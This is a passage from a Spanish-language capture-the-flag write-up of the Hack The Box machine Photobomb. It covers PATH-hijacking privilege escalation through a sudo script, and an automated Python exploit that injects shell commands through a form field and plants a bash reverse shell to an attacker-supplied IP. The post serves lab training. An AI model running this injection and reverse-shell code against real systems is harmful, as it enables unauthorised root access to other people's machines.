<span class="nb">cd</span> /home/wizard/photobomb

<span class="c"># clean up log files</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="o">[</span> <span class="nt">-L</span> log/photobomb.log <span class="o">]</span>
<span class="k">then</span>
  /bin/cat log/photobomb.log <span class="o">&gt;</span> log/photobomb.log.old
  /usr/bin/truncate <span class="nt">-s0</span> log/photobomb.log
<span class="k">fi</span>

<span class="c"># protect the priceless originals</span>
find source_images <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'*.jpg'</span> <span class="nt">-exec</span> <span class="nb">chown </span>root:root <span class="o">{}</span> <span class="se">\;</span>
</pre></table></code></div></div><p>Lo que hace el script es (1) ejecutar el archivo <em>/opt/.bashrc</em>, √©l cual es un script con configuraciones respecto a la sessi√≥n de la terminal cuando un usuario se logea. (2) Luego limpia los logs de la web que anteriormente vulneramos y (3) por √∫ltimo vemos algo interesante, se aplica una b√∫squeda con el comando <code class="language-plaintext highlighter-rouge">find</code> sin usar su ruta absoluta</p><p>Inmediatamente al observar esto se nos viene a la mente la vulnerabilidad <strong>Path Hijacking (secuestro de rutas)</strong> que nos permite secuestrar las rutas habituales que se definen en la variable de entorno <strong>PATH</strong> y asignar nuestras propias rutas junto con nuestros archivos maliciosos</p><p>Entonces lo que podemos hacer es crearnos un archivo tambi√©n llamado <code class="language-plaintext highlighter-rouge">find</code> en una ruta determinada (/tmp/.10.1014.155/find) y con el tag <code class="language-plaintext highlighter-rouge">SETENV</code> agregar a la variable de entorno <code class="language-plaintext highlighter-rouge">PATH</code> nuestra ruta donde se encuentra nuestro archivo malicioso para luego ejecutarlo, conseguir la <code class="language-plaintext highlighter-rouge">shell</code> como <code class="language-plaintext highlighter-rouge">root</code> y la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="gp">wizard@photobomb:~/photobomb$</span><span class="w"> </span><span class="nb">mkdir</span> /tmp/.10.10.14.155
<span class="gp">wizard@photobomb:~/photobomb$</span><span class="w"> </span><span class="nb">cat</span> <span class="o">&gt;&gt;</span> /tmp/.10.10.14.155/find
<span class="gp">#</span><span class="o">!</span>/bin/bash
<span class="go">
chmod u+s /bin/bash
</span><span class="gp">wizard@photobomb:~/photobomb$</span><span class="w"> </span><span class="nb">cat</span> /tmp/.10.10.14.155/find 
<span class="gp">wizard@photobomb:~/photobomb$</span><span class="w"> </span><span class="nb">chmod</span> +x /tmp/.10.10.14.155/find 
<span class="gp">wizard@photobomb:~/photobomb$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
<span class="go">-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
</span><span class="gp">wizard@photobomb:~/photobomb$</span><span class="w"> </span><span class="nb">sudo </span><span class="nv">PATH</span><span class="o">=</span>/tmp/.10.10.14.155:<span class="nv">$PATH</span> /opt/cleanup.sh
<span class="gp">wizard@photobomb:~/photobomb$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
<span class="go">-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
</span><span class="gp">wizard@photobomb:~/photobomb$</span><span class="w"> </span>bash <span class="nt">-p</span>
<span class="gp">bash-5.0#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">bash-5.0#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rw-r----- 1 root root 33 Nov  3 05:54 /root/root.txt
</span></pre></table></code></div></div><p>Para finalizar hice un script en <code class="language-plaintext highlighter-rouge">python</code> para automatizar todo el proceso y conseguir la shell como <code class="language-plaintext highlighter-rouge">root</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="s">"""
Autopwn Photobomb HTB
---------------------
Author : Marss
Date : 01 Nov, 2022
"""</span>

<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">shlex</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="c1"># Ctrl + c (function)
</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[!] User terminated.'</span><span class="p">)</span>

<span class="c1"># Ctrl + c (signal)
</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>


<span class="c1"># Main class
</span><span class="k">class</span> <span class="nc">Exploit</span><span class="p">:</span>
	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">target_url</span> <span class="o">=</span> <span class="p">{</span> <span class="s">'10.10.14.182'</span> <span class="p">:</span> <span class="s">'http://photobomb.htb'</span> <span class="p">}</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">ip</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span>

	<span class="k">def</span> <span class="nf">make_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
				<span class="s">'Authorization'</span> <span class="p">:</span> <span class="s">'Basic cEgwdDA6YjBNYiE='</span><span class="p">,</span>
				<span class="s">'Content-Type'</span> <span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span>
			<span class="p">}</span>

			<span class="n">form_data</span> <span class="o">=</span> <span class="p">{</span>
				<span class="s">'photo'</span> <span class="p">:</span> <span class="s">'eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg'</span><span class="p">,</span>
				<span class="s">'filetype'</span> <span class="p">:</span> <span class="sa">f</span><span class="s">'jpg;</span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
				<span class="s">'dimensions'</span> <span class="p">:</span> <span class="s">'3000x2000'</span>
			<span class="p">}</span>
			
			<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">target_url</span><span class="p">[</span><span class="s">'10.10.14.182'</span><span class="p">]</span> <span class="o">+</span> <span class="s">'/printer'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">form_data</span><span class="p">)</span>
			
		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">"[x] Error: %s"</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">command_inyection</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">make_request</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="c1"># Post request with command injection
</span>		<span class="k">with</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Starting Inyection Attack'</span><span class="p">)</span> <span class="k">as</span> <span class="n">progress</span><span class="p">:</span>

		    <span class="c1"># (1) Create workstation
</span>		    <span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Creating working directory'</span><span class="p">)</span>
		    <span class="bp">self</span><span class="p">.</span><span class="n">command_inyection</span><span class="p">(</span><span class="sa">f</span><span class="s">"mkdir /tmp/.</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
		    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Working directory created'</span><span class="p">)</span>
		    
		    <span class="c1"># (2) Create binary with malicious code (reverse shell in bash)
</span>		    <span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Inyecting malicious code into our binary file'</span><span class="p">)</span>
		    <span class="bp">self</span><span class="p">.</span><span class="n">command_inyection</span><span class="p">(</span><span class="sa">f</span><span class="s">"echo </span><span class="se">\"</span><span class="s">#!/bin/bash</span><span class="se">\\</span><span class="s">nbash -c 'bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s"> 0&gt;&amp;1'</span><span class="se">\"</span><span class="s"> &gt; /tmp/.</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="si">}</span><span class="s">/find &amp;&amp; chmod +x /tmp/.</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="si">}</span><span class="s">/find"</span><span class="p">)</span>
		    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'Binary created: /tmp/.</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="si">}</span><span class="s">/find'</span><span class="p">)</span>
		    
		    <span class="c1"># (3) Listening mode
</span>		    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'Open port </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s"> to receive root shell (g.e /usr/bin/nc -l </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s">)'</span><span class="p">)</span>
		    <span class="nb">input</span><span class="p">(</span><span class="s">'Press ENTER to continue.'</span><span class="p">)</span>
		    
		    <span class="c1"># (4) Execute binary like root to receive shell
</span>		    <span class="n">progress</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Getting connection in a few seconds'</span><span class="p">)</span>
		    <span class="bp">self</span><span class="p">.</span><span class="n">command_inyection</span><span class="p">(</span><span class="sa">f</span><span class="s">"sudo PATH=/tmp/.</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="si">}</span><span class="s">:$PATH /opt/cleanup.sh"</span><span class="p">)</span>

		    <span class="c1"># (5) Removing working directory and binary file
</span>		    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Removing working directory and files'</span><span class="p">)</span>
		    <span class="bp">self</span><span class="p">.</span><span class="n">command_inyection</span><span class="p">(</span><span class="sa">f</span><span class="s">"rm -rf /tmp/.</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">ip_address</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>


<span class="c1"># Main flow
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">ascii_title</span> <span class="o">=</span> <span class="s">"""
	                               __
	 /\      |_  _   _       _    |__) |_   _  |_  _  |_   _   _  |_ 
	/--\ |_| |_ (_) |_) \)/ | )   |    | ) (_) |_ (_) |_) (_) ||| |_)
	                |                                                
	                                                            by marss
  """</span>
	<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
		<span class="n">description</span><span class="o">=</span><span class="n">ascii_title</span><span class="p">,</span>
		<span class="n">formatter_class</span><span class="o">=</span><span class="n">argparse</span><span class="p">.</span><span class="n">RawDescriptionHelpFormatter</span><span class="p">,</span>
		<span class="n">epilog</span><span class="o">=</span><span class="s">"""Example:
		autopwn.py -i 10.10.10.10 -p 4444
		"""</span><span class="p">)</span>

	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-i'</span><span class="p">,</span> <span class="s">'--ip'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'specified IP to receive the shell'</span><span class="p">)</span>
	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--port'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'specified PORT to receive the shell'</span><span class="p">)</span>

	<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

	<span class="k">print</span><span class="p">(</span><span class="n">ascii_title</span><span class="p">)</span>

	<span class="n">exploit</span> <span class="o">=</span> <span class="n">Exploit</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>

	<span class="n">exploit</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
</pre></table></code></div></div><p><img data-src="/assets/img/htb/writeups/photobomb/autopwn.png" alt="Autopwn" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio: <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Autopwn_Photobomb">https://github.com/E1P0TR0</a></p></div></blockquote><p>Como √∫ltimo veamos las malas pr√°cticas que nos permitieron escalar privilegios:</p><blockquote><p>Asignar a un usuario del sistema la ejecuci√≥n de comandos como un usuario privilegiado (file: /etc/sudoers.d/photobomb)</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">wizard photobomb = (root) NOPASSWD:SETENV: /opt/cleanup.sh
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>M√°ss informaci√≥n sobre el archivo <code class="language-plaintext highlighter-rouge">sudoers</code>: <a href="https://www.digitalocean.com/community/tutorials/how-to-edit-the-sudoers-file">https://www.digitalocean.com/community/tutorials/how-to-edit-the-sudoers-file</a></p></div></blockquote><blockquote><p>Sumando a lo anterior. Usar binarios del sistema sin asignar su ruta absoluta del sistema (file: /opt/cleanup.sh)</p></blockquote><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c">#...</span>
find source_images <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'*.jpg'</span> <span class="nt">-exec</span> <span class="nb">chown </span>root:root <span class="o">{}</span> <span class="se">\;</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a> <a href="/tags/information-leakage/" class="post-tag no-text-decoration" >Information Leakage</a> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >Command Injection</a> <a href="/tags/path-hijacking/" class="post-tag no-text-decoration" >Path Hijacking</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >Python Scripting</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Photobomb - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBPhotobomb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Photobomb - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBPhotobomb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBPhotobomb/&amp;text=Hackthebox Writeup Photobomb - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBOpensource/"><div class="card-body"> <em class="timeago small" data-ts="1656392833" > 2022-06-28 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Opensource</h3><div class="text-muted small"><p> Entorno Linux con una aplicaci√≥n en un servidor web con Python que permit√≠a en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar RCE (Remote code execution) a...</p></div></div></a></div><div class="card"> <a href="/posts/HTBPaper/"><div class="card-body"> <em class="timeago small" data-ts="1648192921" > 2022-03-25 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Paper</h3><div class="text-muted small"><p> Empezando con la enumeraci√≥n encontramos servicios web en Wordpress con un hostanme oculto en la cabezera X-Backend-Server. Luego encontramos una vulnerabilidad en la versi√≥n actual de Wordpress qu...</p></div></div></a></div><div class="card"> <a href="/posts/HTBNoter/"><div class="card-body"> <em class="timeago small" data-ts="1657962497" > 2022-07-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Noter</h3><div class="text-muted small"><p> Overview: User validation by Error Messages in Login process. Brute force default Flask‚Äôs Session Management. User passwords, Backup code, database credentials by Information Leakage. Rem...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBUpdown/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Updown</p></a> <a href="/posts/HTBMetaTwo/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Metatwo</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2023 <a href="https://twitter.com/username">Marsello Guill√©n</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
